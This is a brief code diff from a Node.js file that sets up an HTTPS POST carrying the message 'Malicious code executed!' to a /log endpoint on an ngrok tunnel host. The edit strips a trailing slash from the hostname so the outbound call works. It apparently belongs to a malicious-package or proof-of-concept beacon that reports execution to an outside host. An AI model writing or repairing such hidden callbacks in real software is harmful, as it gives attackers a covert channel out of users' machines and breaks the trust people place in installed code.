@@ -7,7 +7,7 @@ const http = require('http');
 const data = JSON.stringify({ message: 'Malicious code executed!' });
 
 const options = {
-  hostname: 'c073-37-202-73-127.ngrok-free.app/',
+  hostname: 'c073-37-202-73-127.ngrok-free.app',
   port: 443,
   path: '/log',
   method: 'POST',
